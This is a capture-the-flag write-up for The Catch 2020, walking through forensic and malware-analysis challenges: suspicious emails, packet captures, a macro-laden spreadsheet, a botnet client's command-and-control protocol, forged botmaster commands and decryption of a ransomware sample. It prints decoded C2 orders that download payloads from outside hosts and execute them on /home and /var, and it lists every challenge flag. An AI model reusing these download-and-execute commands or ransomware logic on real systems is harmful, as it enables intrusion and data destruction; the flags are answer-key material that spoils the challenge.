# The Catch 2020

https://www.thecatch.cz/

- [`FLAG{a5AG-IVeK-jYvv-Brvq}` Intro](#intro)
	- [`FLAG{Tyqz-EgrI-8G7E-6PKB}` Malicious e-mails](#malicious-e-mails)
	- [`FLAG{SaXY-u8fc-p1Kv-oXoT}` Spam everywhere](#spam-everywhere)
	- [`FLAG{MXcz-PrQK-FJbJ-jWVA}` Easy Bee](#easy-bee)
	- [`FLAG{YHsB-hr0J-W2ol-fV17}` Wiretaped Message`](#wiretaped-message)
- [`FLAG{Jb91-XGSI-05xR-kqgQ}` Promotion](#promotion)
	- [`FLAG{rUn5-GwMR-IlY6-orZd}` Malware spreading](#malware-spreading)
	- [`FLAG{XRC9-XyEE-tlTV-nOl7}` Attachment analysis](#attachment-analysis)
	- [`FLAG{l03Y-BDjA-uB5v-PHVB}` Downloaded File](#downloaded-file)
	- [`FLAG{kT0c-WTfc-S326-Jp1A}` The Connection](#the-connection)
	- [`FLAG{uLHI-3Zq1-kOHx-FGR1}` Botnet master](#botnet-master)
	- [`FLAG{TMMW-rUaP-B2Ko-XejX}` Ransomware](#ransomware)
- [`FLAG{aKAL-qQhH-MsAz-miUG}` Epilogue](#epilogue)

## Intro

> Hi, junior investigator!
>
> Recently, severe danger for whole humanity has emerged again in form of aggressive virus malware, which decimates the Internet population. Many computers were infected a nearly all of them were encrypted by ransomware called `RANSOMVID-20`. Some governments have already announced digital quarantine for most affected companies and its employees are not allowed to use computers, smartphones, etc.
>
> We need your help to solve this issue, otherwise we will have to return to the steam age technologies. Enter the code `FLAG{a5AG-IVeK-jYvv-Brvq}` to get the access to the Training Ground.
>
> Good luck!

### Malicious e-mails

> Hi, junior investigator!
>
> We have extracted a bunch of suspicious e-mails. We believe that you can analyze them and find their secret.
>
> Use password `MaIlZZzz-20` to [download the evidence](malicious_emails/malicious_emails.zip)
>
> Good Luck!

There is bunch of emails in the archive. I extracted them with `ripmime`

```sh
ls *.eml | xargs -n1 ripmime -i
```

every email contains http address and [one of them](http://challenges.thecatch.cz:20100/npelfsd0btmaovy2) contains the final flag.

```sh
cat textfile* | grep -o 'http://[^ ]*' | xargs curl 2>/dev/null
```

### Spam everywhere

> Hi, junior investigator!
>
> We get some recorded traffic, we believe you can analyze it and found whether it contains something malicious.
>
> Use password `sPaMMerS-wOrKS` to [download the evidence](spam_everywhere/spam_everywhere.zip)
>
> Good Luck!

The pcap in the archive contains 35 SMTP connections, where everyone is used to send exactly one email. Most of them are spam advertising **The Cure from RANSOMVID-20**. The flag is in the image.

![](spam_everywhere/rv20protector.png)

### Easy Bee

> Hi, junior investigator!
>
> We have for you something malicious called "Easy Bee". We believe that you can analyze it and found what is its purpose.
>
> Use password `eAsY-beE-mAlWr-20` to [download the evidence](easy_bee/easy_bee.zip)
>
> Good Luck!

The archive contains binary `easy_botnet_client.exe`. The simplest solution is to dump the network communication and inspect transfered data (I run the binary in wine). The client connects to `78.128.216.92:20200` and sends the message `Easy-Bee-358n9pqh ready for work`. The server replies `Hello, your order is to keep in secret this flag: FLAG{MXcz-PrQK-FJbJ-jWVA}`.

### Wiretaped message

> Hi, junior investigator!
>
> We have wiretaped strange communication - probably a message. Try to decode it.
>
> Use password `wiREtaPeD-msG` to [download the evidence](wiretaped_message/wiretaped_message.zip)
>
> Good Luck!

Every message is encoded with 2 bytes for length of the message in big endian followed by data. Data are base64 encoded. I used following script to decode all data.

```python
import base64
import sys

f = open(sys.argv[1], 'rb')

for i in range(31):
	l = int.from_bytes(f.read(2), byteorder='big')
	b64 = base64.b64decode(f.read(l)).decode()
	print(l, b64)

f.close()
```

## Promotion

> Hi, junior investigator!
>
> You have successfully completed the training and earned the promotion to the **Executive Senior Investigator**. You are ready to get access to the malware research facility - just enter the code `FLAG{Jb91-XGSI-05xR-kqgQ}` and save the world from the RANSOMVID-20 imminent threat. Remember - many of our experienced investigators have been already digitally quarantined, so be careful!
>
> Good luck!

### Malware spreading

> Hi, executive senior investigator!
>
> We suspect that the malware is primarily spreaded somehow by e-mail. We have partial traffic dump from one small company, that was attacked. Try to check this hypothesis.
>
> Use password `ThE-MaLWr-MaIlZZz-20` to [download the evidence](malware_spreading/malware_spreading.zip)
>
> Good Luck!

The pcap from given archive contains 4 tcp connections to imap server. There is an email with `<winning_numbers.zip>` attachment in **Alice** mail box.

```
Return-Path: <lorem@genuine-national-lottery.cz>
X-Original-To: alice@cypherfix.cz
Delivered-To: alice@cypherfix.cz
Received: from mx.genuine-national-lottery.cz (mx.genuine-national-lottery.cz [203.0.113.150])
	by mail.cypherfix.cz (Postfix) with ESMTP id 013DD60535
	for <alice@cypherfix.cz>; Mon,  5 Oct 2020 22:01:09 +0200 (CEST)
Received: from [203.0.113.92] (mail-sor-f41.google.com [mail-sor-f41.google.com]) 
	by mx.genuine-national-lottery.cz (Postfix) with ESMTP id E4444821AA
	for <alice@cypherfix.cz>; Mon,  5 Oct 2020 20:01:08 +0000 (UTC)
Content-Type: multipart/mixed; boundary="===============2043998906902155698=="
MIME-Version: 1.0
User-Agent: Mutt/1.10.1 (2018-07-13)
Message-Id: <160192806888.20243.12819215096109337023@27f13e44ef5b>
From: Lorem Ipsum <lorem@genuine-national-lottery.cz>
To: Alice Nelson <alice@cypherfix.cz>
Subject: The prediction
Date: Mon,  5 Oct 2020 20:01:08 +0000 (UTC)

--===============2043998906902155698==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

Dear Alice,
I know it - you are the right person to cooperate. The numbers you are looking for, are in attachment. The password was send on your cell. Enjoy your (our) prize!

Lorem
--===============2043998906902155698==
Content-Type: application/octet-stream
MIME-Version: 1.0
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename=<winning_numbers.zip>

UEsDBBQACQAIAIJYQVEJNsOIqEMAAPhTAAAaABwAbmF0aW9uX2xvdHRlcnlfbnVtYmVycy5vZHNV
VAkAA4SbdV+Em3VfdXgLAAEEAAAAAATnAwAAyGLAGz7fLqYUdXMocddTUam0LApC2qdKxDQauLyH
BICNYjxwXaRpajF37BmyLqE4m1vvi8ZfQJdFrX5IFDk/yoGhjOwmrTxVzf7K2F9pWZuDCRMw2b/W
...
AAD4UwAAGgAYAAAAAAAAAAAA+IEAAAAAbmF0aW9uX2xvdHRlcnlfbnVtYmVycy5vZHNVVAUAA4Sb
dV91eAsAAQQAAAAABOcDAABQSwUGAAAAAAEAAQBgAAAADEQAAAAA

--===============2043998906902155698==--
```

**Alice** than e-mailed to **John** about her struggle with the attachment, followed by secret password (`HappyWinner-paSSw00rd42`) necessary to open the attachment.

```
From: Alice Nelson <alice@cypherfix.cz>
To: John Johnson <john@cypherfix.cz>
Subject: Rich rich rich!

Johnny, I need your help!
I got the winning lottery numbers and we can be really rich :) But my computer is too slow or entro-something is wrong inside and it can't show me the numbers :(. I left a flash drive on your desk, run the only file that's there and gimme the results.
Thanks and see ya!
A.
```

```
From: Alice Nelson <alice@cypherfix.cz>
To: John Johnson <john@cypherfix.cz>
Subject: Rich and stupid :)

Oh my, you will need the secret 'HappyWinner-paSSw00rd42'. See ya! A.
```

We found `nation_lottery_numbers.ods` file in `<winning_numbers>.zip`. I run following commands to find the flag

```sh
7z x nation_lottery_numbers.ods
find -type f | xargs grep -F 'FLAG{'
```

### Attachment analysis

> Hi, executive senior investigator!
>
> Well done, we have acquired the malicious mail attachment. Now, you should take a closer look on it and find out, how it works.
>
> Use password `ThE-aTTacHmEnt-20` to [download the evidence](attachment_analysis/attachment_analysis.zip)
>
> Good Luck!

This archive contains another `nation_lottery_numbers.ods`. `ODS` file is basically zip archive full of XMLs.

```
$ 7z l nation_lottery_numbers.ods
Path = nation_lottery_numbers.ods
Type = zip
Physical Size = 36638

   Date      Time    Attr         Size   Compressed  Name
	------------------- ----- ------------ ------------  ------------------------
	2020-09-21 12:29:32 D....            0            0  Basic
	2020-09-15 22:01:20 .....          338          211  Basic/script-lc.xml
	2020-09-21 12:29:32 D....            0            0  Basic/Standard
	2020-09-21 12:29:32 .....        35220        15431  Basic/Standard/Module1.xml
	2020-09-15 22:01:20 .....          348          214  Basic/Standard/script-lb.xml
	2020-09-21 12:29:32 D....            0            0  Configurations2
	2020-09-15 22:01:20 D....            0            0  Configurations2/accelerator
	2020-09-15 22:01:20 D....            0            0  Configurations2/floater
	2020-09-21 12:29:32 D....            0            0  Configurations2/images
	2020-09-15 22:01:20 D....            0            0  Configurations2/images/Bitmaps
	2020-09-15 22:01:20 D....            0            0  Configurations2/menubar
	2020-09-15 22:01:20 D....            0            0  Configurations2/popupmenu
	2020-09-15 22:01:20 D....            0            0  Configurations2/progressbar
	2020-09-15 22:01:20 D....            0            0  Configurations2/statusbar
	2020-09-15 22:01:20 D....            0            0  Configurations2/toolbar
	2020-09-15 22:01:20 D....            0            0  Configurations2/toolpanel
	2020-09-15 22:01:20 .....        15020         2012  content.xml
	2020-09-21 12:29:32 D....            0            0  Dialogs
	2020-09-15 22:01:20 .....          338          211  Dialogs/dialog-lc.xml
	2020-09-21 12:29:32 D....            0            0  Dialogs/Standard
	2020-09-15 22:01:20 .....          348          213  Dialogs/Standard/dialog-lb.xml
	2020-09-15 22:01:20 .....          796          363  Dialogs/Standard/Dialog1.xml
	2020-09-15 22:01:20 .....          899          261  manifest.rdf
	2020-09-21 12:29:32 D....            0            0  META-INF
	2020-09-15 22:01:20 .....         1599          337  META-INF/manifest.xml
	2020-09-15 22:01:20 .....          873          428  meta.xml
	2020-09-15 22:01:20 .....           46           44  mimetype
	2020-09-15 22:01:20 .....        29902         4794  settings.xml
	2020-09-15 22:01:20 .....         9890         1700  styles.xml
	2020-09-21 12:29:32 D....            0            0  Thumbnails
	2020-09-15 22:01:20 .....         5270         5229  Thumbnails/thumbnail.png
	------------------- ----- ------------ ------------  ------------------------
	2020-09-21 12:29:32             100887        31448  14 files, 17 folders
```
`Basic/Standard/Module1.xml` holds the visuab basic script which is extracted to [`attachment_analysis/1.vb`](attachment_analysis/1.vb). I copied it to the [`attachment_analysis/1.py`](attachment_analysis/1.py), commented all lines and than I started slowly uncommenting and pythonifying them. I skipped parts which did not seem to be necessary for final result. The script prints out multiple addresses, where [`http://challenges.thecatch.cz:20101/FILORUX_update_OB127q45D.msi`](http://challenges.thecatch.cz:20101/FILORUX_update_OB127q45D.msi) points to the flag.

### Downloaded file

> Hi, executive senior investigator!
>
> The file, you have acquired in previous investigation is not the malware, we were looking for. The attacker probably replaced it to fool us. Fortunatelly, we have a traffic dump, where you can probably find the original file. Try to find it and do not forget to be sure it is the correct file.
>
> Use password `ThE-doWNloAdeD-fIlE-20` to [download the evidence](downloaded_file/downloaded_file.zip)
>
> Good luck!

The given pcap file from archive contains multiple connections. I filtered out all TCP/*:443 and UDP/*:53 which simplified the output significantly. In remaining connections we can see:

- 94.23.180.49:80 -> online casino browsing
- 198.51.100.150:80 -> 4 fake client elf files
- 198.51.100.150:20101 -> The original client elf file
- 78.128.216.92:20210 -> communication with cnc

Fake clients just print out `Connection failed, try again` after 5 seconds.
The original client prints out following message, when we run it without parameters:
```
usage: client [-h] -ip IPADDRESS -p PORT
client: error: the following arguments are required: -ip/--ipaddress, -p/--port
```
But we have found messages from communication with cnc server
```
00000000  00 00 00 00 00 00 00 1f  68 6a 68 61 76 68 35 72  |........hjhavh5r|
00000010  6c 62 62 37 78 72 69 61  20 72 65 61 64 79 20 66  |lbb7xria ready f|
00000020  6f 72 20 77 6f 72 6b 00  00 00 00 00 00 00 04 31  |or work........1|
00000030  28 35 29                                          |(5)|
00000033
```
So, let's try to run it with cnc ip address and port
```
./client -ip 78.128.216.92 --port 20210
```
Hurray, we have a Flag.

Anyway, I tried to decompile binaries and fake client has basically just this functionality (complete script is [here](downloaded_file/fake_client.py))
```python
    outtext = 'Connection failed, try again  '
    sleep(5)
    print('{}'.format(outtext))
```
The original client does not connect anywhere as well. It contains the flag encrypted with AES, where IP address and port are used to construct the decryption key. You could see decompiled script [here](downloaded_file/downloaded_client.py).

### The Connection

> Hi executive senior investigator!
>
> Cool, you have found the malware dropped on target computer. According to your defined procedure and your previously detected IoC (indicators of compromise), we were able to find other versions of malware in traffic dumps - we assume it is some kind of botnet client. Unfortunatelly, it looks like the C2 server has been meanwhile upgraded and although the server reacts to client's messages, the client can't decode the orders. You should investigate the communication.
>
> Use password `ThE-CaNDc-cONNecTiOn-20` to download the evidence
>
> Good luck!

The given client sends `gwfj6723v5i9szya;;ready` message to the cnc server 78.128.216.92:20210, which returns data similar to this:
```
00000000  00 00 00 00 00 00 00 30  4e 54 4d 30 4d 7a 63 7a  |.......0NTM0Mzcz|
00000010  4e 7a 4e 69 4d 32 49 7a  4e 44 63 35 4e 6a 45 32  |NzNiM2IzNDc5NjE2|
00000020  4e 7a 64 68 65 58 70 7a  4f 57 6b 31 64 6a 4d 79  |NzdheXpzOWk1djMy|
00000030  4e 7a 5a 71 5a 6e 64 6e                           |NzZqZndn|
00000038
```
We can see, that first 8 bytes encodes length of the message. The message itself is base64 encoded and after decoding we got
```
13837383b3b347961677ayzs9i5v3276jfwg
```
Now, we can notice that the message ends with reversed id `gwfj6723v5i9szya`. So, let's reverse it
```
gwfj6723v5i9szya776169743b3b38373831
```
We got `776169743b3b38373831` hex string when we cut out 16 characters of ID from the beginning. They all look ascii printable and indeed they are `wait;;8781`.
So, this is the recipe for message decoding:
```python
def decode(msg):
    l = struct.unpack('>Q', msg[:8])[0]
    rev = base64.b64decode(msg[8:8 + l])[::-1]
    prefix, out = rev[:16].decode('ascii'), rev[16:]
    out = binascii.unhexlify(out).decode('ascii')
    return (prefix, out)
```
Let's wrap it to the [script](the_connection/solve.py) which will send the `;;ready` message continuously and it will print out decoded messages.
Output of the script may look somehow like this.
```
('zc13psyobd5m4jvk', 'wait;;230')
('zc13psyobd5m4jvk', 'download;;http://challenges.thecatch.cz:20102/ransomvid1984.bin;;/tmp/apt-update')
('zc13psyobd5m4jvk', 'download;;http://challenges.thecatch.cz:20102/key1984.RV20;;/tmp/key')
('zc13psyobd5m4jvk', 'execute;;/tmp/apt-update -k /tmp/key -p /home/')
('zc13psyobd5m4jvk', 'execute;;/tmp/apt-update -k /tmp/key -p /var/')
('zc13psyobd5m4jvk', 'wait;;12425')
```
The flag is hidden in this url [`http://challenges.thecatch.cz:20102/ransomvid1984.bin`](http://challenges.thecatch.cz:20102/ransomvid1984.bin).

### Botnet master

> Hi, executive senior investigator!
>
> We have managed to get a rare catch - a traffic dump of issuing commands for the C2 server by its master! Glory to the network specialists of unnamed company. Try to find out how this communication works.
>
> Use password `maSTeR-aND-coMMAndEr` to download the evidence
>
> Our network analytics report that one of currently online C2 servers can be found on IP `78.128.216.92` on `TCP/20220`.
>
> Good luck!

The goal of this challenge is to mimic botmaster and therefore to be able to send some commands to the cnc server. Messages in the pcap file are encdoded in the same fashion like in the previous challenge [The Connection](#the-connection) but in both directions. We can identify botmaster after decoding all messages, it uses id `kl5puyj43brf7iso` and here is list of all commands and responses he sent:
```
kl5puyj43brf7iso;;execute;;*;;ls /etc;;b8d4cd29e64dbf3cec215e6444ef8d5eff5df0f75389fb564ecb13008a6738a681a1f3cfe1ef3699cd9a5809eb7fa9f6
command accepted;;
--
kl5puyj43brf7iso;;download;;*;;/tmp/update;;http://198.19.220.13:80/update2.bin;;d954e7c208079d348f7763176a0a65b6b43f01c49439b970a7e73ab2d59c0a000c8cff64981f1e918ba110cd1de7dd24
command accepted;;
--
kl5puyj43brf7iso;;info;;203.0.113.16.20202;;clients;;c3c832bc83fa5d291559487932c5f57d35e838dfe9ec385b49dd45e0a28095738012082401d8b35e55411a25a1acfb96
ffff0000ffff0000,0hpxc5sdo9kgne64,c6p0x84lamhowyk5,06fylhnt3wm4ikrx,irg6s7z8xvbnh0aj,dhps6t2u5egi1jrx,eimxd0lj4tby5gf7,ez0by4jqd3sikm8c,ds21bowz45903pgm,ws1mk4iae80b53jc,51awbq6mk32nejil,1nhxcp2saj4d685g
--
kl5puyj43brf7iso;;wait;;0hpxc5sdo9kgne64;;30;;b7894e9dfb8e92c804fd463d0f3fc1d674a448291a8f049a40a2bed111a0a32d5f257c255fcb645cbd553a6e7debf4c3
command accepted;;
--
kl5puyj43brf7iso;;info;;203.0.113.16.20202;;active;;3799114f203fbb343e8003ab2bc7dc1890d2e748ed4d6f17d630cb0f70db1a89e5ed98609e41136b3d44836a52a12122
ffff0000ffff0000,0hpxc5sdo9kgne64,c6p0x84lamhowyk5,06fylhnt3wm4ikrx,irg6s7z8xvbnh0aj,dhps6t2u5egi1jrx,eimxd0lj4tby5gf7,ez0by4jqd3sikm8c,ds21bowz45903pgm,ws1mk4iae80b53jc,51awbq6mk32nejil,1nhxcp2saj4d685g
--
kl5puyj43brf7iso;;download;;0hpxc5sdo9kgne64;;/tmp/flag;;http://198.19.220.13:80/flag;;cfb8ad2096b87f07ef3154e198862bab81bce63cba14fd1ecd01ac83c849a42df494dd3b64793f4fad8cc02aa21ec61e
command accepted;;
--
kl5puyj43brf7iso;;download;;0hpxc5sdo9kgne64;;/tmp/e53;;http://198.19.220.13:80/e53;;6d855614bc506728ec6015b27d1f195307bf20874896f23c5b3b7fe22005d74eb82d4740209b1be17e2de0ff3d5055f1
command accepted;;
--
kl5puyj43brf7iso;;info;;203.0.113.16.20202;;active;;3799114f203fbb343e8003ab2bc7dc1890d2e748ed4d6f17d630cb0f70db1a89e5ed98609e41136b3d44836a52a12122
ffff0000ffff0000,0hpxc5sdo9kgne64,c6p0x84lamhowyk5,06fylhnt3wm4ikrx,irg6s7z8xvbnh0aj,dhps6t2u5egi1jrx,eimxd0lj4tby5gf7,ez0by4jqd3sikm8c,ds21bowz45903pgm,ws1mk4iae80b53jc,51awbq6mk32nejil,1nhxcp2saj4d685g
--
kl5puyj43brf7iso;;download;;*;;/tmp/key;;http://198.19.220.13:80/key;;17dfdf78c676a747ed0640f6b01b1693ccb1bf0ad915ac9b04e2fdace5e109402f67cd7499b028216a07c2c839d4f5fd
command accepted;;
--
kl5puyj43brf7iso;;download;;*;;/tmp/update;;http://198.19.220.13:80/update2.bin;;d954e7c208079d348f7763176a0a65b6b43f01c49439b970a7e73ab2d59c0a000c8cff64981f1e918ba110cd1de7dd24
command accepted;;
--
kl5puyj43brf7iso;;info;;203.0.113.16.20202;;active;;3799114f203fbb343e8003ab2bc7dc1890d2e748ed4d6f17d630cb0f70db1a89e5ed98609e41136b3d44836a52a12122
ffff0000ffff0000,0hpxc5sdo9kgne64,c6p0x84lamhowyk5,06fylhnt3wm4ikrx,irg6s7z8xvbnh0aj,dhps6t2u5egi1jrx,eimxd0lj4tby5gf7,ez0by4jqd3sikm8c,ds21bowz45903pgm,ws1mk4iae80b53jc,51awbq6mk32nejil,1nhxcp2saj4d685g
--
kl5puyj43brf7iso;;wait;;*;;5;;944f8b5a851f3ee8c4c8d0a30ca2f2b94cc6a3371b9ca09c4634d2da4884c44e5afb7ea7329ce724e38d07d7a4ebcfeb
command accepted;;
```
The main difference with bot messages is that every command is appended with hash. The hash is 96 characters long hex string, representing 384 bits wide hash. `sha384` seems to be the best candidate. Let's try it
```
echo -n 'kl5puyj43brf7iso;;wait;;*;;5' | sha384sum
944f8b5a851f3ee8c4c8d0a30ca2f2b94cc6a3371b9ca09c4634d2da4884c44e5afb7ea7329ce724e38d07d7a4ebcfeb  -
```
Now we have to send right command `;;info;;78.128.216.92.20220;;clients` (complete script is [here](botnet_master/solve.py))
```
('kl5puyj43brf7iso', ';;info;;78.128.216.92.20220;;clients')
kl5puyj43brf7iso;;info;;78.128.216.92.20220;;clients;;b9817f590c8d6b39ea92740ccd2790ab568a1880670780dbcde7ab3f8d1a7f80c2e131a96553583f9b6691f981620870
('0000000000000000', 'szqv0k7i3wc4x28p,hrf83ywuxan6g710,49vwpbry1gl2m0x6,gziok2nlvshjt40q,1wygo68xifsnmp25,7xdjquo5hnysgtc2,thbp8wzj0am2nfkv,xtyzo67pblm5uk8a,ygs13n0ewkrmi92q,6cq2so4ki9geauw7,kt4q0wyouxsnv5zl,4ymensulvr0cw6ka,w2vbckh9x743q1m8,bcsyzftgv47108kj,0ze5pi6d2tgs7b9a,2ycu6w3ao5xk81mj,w9bpa8crlz35etn1,yqsw1id625hbnkog,wusy3k5a9q8pjlve,2sk6glfv57n8dti3,y4v60brqixkeg7ow,ko3jw8ta2d69s41l,4ytocqf38bzjhv1x,ytbvpxwu5ealzk7i,32vo84d65u17tkfp,fvpz3noikus8qycb,3wpn8szkor64u5yb,v67drax459gphs1e,s15aeq0pn2g3j6xh,b4rdsgt1n3woceuf,2a3kqfn9lx4z6jmg,pys2iobz0gf516nj,685tohls30mjd2af,zmh5kebpnao986xd,h0a6igwbyl2xstne,f076a8u9ign1wm3c,69a54ef1cgotuxwn,rswg76vyoqkdj0im,7a1oh5ivrye82slk,z3awgmjexqdnf0hi,glomn4fzk5w03ryq,ik8704gdjms6etxp,he4itz5dn8jfr2p1,zus4qoa2m1ckxlhy,6cfod9k57am4b1h8,9qjmoxezpcrywb16,7fdeg9wxnhzbs86a,elku3brh1ja0d2vn,ne9q7xj8al02zk1g,rofqnxa7kjc480ht,kfq2bd3xj9ymc4uh,9sjo4dh0gtmyv3zp,sub4zp13nhltgc2j,i5vbwh2k6oalex19,8vbyhngx9d063z2f,07utr6cpwijysado,hi5v7mqwd1gn3axy,0wseyjtol8r7c51n,dmtz14qb5owl82nf,59u4zxto6aws8bi2,68hg0tyc52aw1bdi,2lvsmc5uh78k3gp4,ucto0kifh8ewndpj,x0turbs4k32jn9e7,i5afnw8oueh96xvb,6liy7mdwkav20fjs,kbzens1rafxh2p0o,wueb51xyvczqk9if,5wylkjv1n3tp8srz,0gdi4n6a5yoz3fs7,x452baflo3dkhe9p,4zvyrne0lk6us8b3,2cyrtjli98o0vh1a,saf5gn87uimw4vdz,gd9oa2ypnhmx7cqi,p6twq1rc0lm9bhv4,xea2d0wcynbl716z,0y8ec1jtbsonx76q,b7nfcwgsadq35uli,ykso4ug2enidz9r7,o1y4uif6x3petqr9,vp6aw5cbzir9hy2e,nu4xckep05v3ihaf,bszxunhd3wvc52o9,0e9mzviqfrltuaxw,sump87hkwe1d2b4x,fmt8rzy62qwk34uj,ivfc2lqzjm5aoxuk,lt0szb4uvgkwnxq1,v4ahui3y8kjnoq91,yjgsokt38iqcla1e,vcxr4keh5onyl2t6,pewgkbru8563oht0,jm5fv9xuctizwpdl,etkvyilf6oads7p8,04f1qpjmk5h8av9r,FLAG{uLHI-3Zq1-kOHx-FGR1},8jv5c2fet06yk9mg,o91v7bct8zpq045l,8a6gcvhxtlk2z40i,47ke3rfyd15mhiwu,a0wdcnk6l1y5gpz9,gqr2hz7bwliea4nc,2oa8vuxitp6mqzcl,mby4eju2i8dp6lxo,4o75zxhn0ilwpbjt,6iow2fjny0d8uc5z,jlwp5avhsy2ufok9,j2owabrvkln4me97,2bh8dnlv6k4ypt01,pvwahzkj8153g6b7,f03xc1lgmuqz5jhe,zg9qjpdi4l86sce2,6jbnr89fw05lpcq4,req18kvgfoc5yb6l,1x62cjq0znsfi9lv,g6r1xzc78ipjunmo,yujgbkpcsdv65r3q,rphsuicqa6gyoxvt,gsdt3mc2vw1ai6pf,clgjkd2534a8qns9,1ib4wpqmfexk68o5,3rnt5lok4qyzgp62,bxm2yugh34vez5qr,cldf89oenwpvy40m,w1059nsqv4otakmy,2baw3ptkvfeinucy,adkny13cxew2f64t')
```
Well, the flag is nicely hidden in between other clients. It really took me while to notice it and at the end it took me longer than necessary to solve this challenge. And the lesson learned? Search the `FLAG{` pattern everywhere. It is just simple `grep` :S

### Ransomware

> Hi, executive senior investigator!
>
> Finally, we have acquired the `RANSOMVID-20` encryption module. According to the information from our partners, it encrypts files on any drives, it can found. We have also one image of relatively small drive, which was affected by `RANSOMVID-20` only (no user or system action were undertaken). Try to find out how to decrypt the files without paying any single TCC.
>
> Use password `rAnSOmVID-20` to download the evidence
>
> Good luck!
>
> **WARNING: The ransomware executable is dangerous - virtual machine is strongly recommended for the analysis.**

This one was the most exciting one. We have got `ransomvid_20.exe` binary and `image.dd` dump. We can notice that the binary was created with [PyInstaller](https://www.pyinstaller.org/) after inspection of strings in the binary. PyInstaller packs python applications into standalone executable. We need to reverse it and I found [PyInstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor) which does exactly what we need, the collection of `pyc` python compiled byte code files. We can now decompile the bytecode. I used [uncompyle6](https://github.com/rocky/python-uncompyle6/) decompiler and the result is great, it is runnable without further modification (see [`ransomvid_20.py`](ransomware/ransomvid_20.py)).

The problem of this ransomware is that it uses the same seed for pseudo-random generator to generate aes keys. Encrypted files has always same structure, starting with magic number `RV20`, followed by 256 bytes of RSA encrypted AES key, followed by 8 bytes of original length in big endian, followed by encrypted data. Fortunately, we do not need to decrypt the key. We have whole image and therefore we can reconstruct decryption of files in the same order as encryption was done, which allows us to generate AES keys, without having the RSA private key.

I basically changed the original file to a decryptor, see [`deransomvid_20.py`](ransomware/deransomvid_20.py). The script accepts `--path <path>` of mounted image and produces decrypted copy to to `o<path>`. The `--keyfile` is still mandatory but could be anything, because it is not used at all. The `o<path>` must contain original directory structure. Those are painfalls of this script.

```
mkdir img
sudo mount -o loop,ro,noexec,nodev,nosuid image.dd img
mkdir -p oimg/{c.a.t.-backup,flags,private}
python3 deransomvid_20.py -p img -k -
```
And the last command gives the flag
```
head -n 35 oimg/private/iustum.txt | tail -n25 | xargs printf '%c'
```

## Epilogue

> Hi, savior of the world!
>
> You have succesfully analyzed all aspects of the dreadful malware, which has threatened the Internet population. The digital quarantine can be now lifted and the happy users can return to their ordinary activities - especially to searching pictures and videos of fluffy cute kittens...
>
> We would like to ask you to fill short questionnaire - we need some information for eventual prize delivery.
>
> You can also enter the flag `FLAG{aKAL-qQhH-MsAz-miUG}` to set this challenge green :-)
>
> See you!
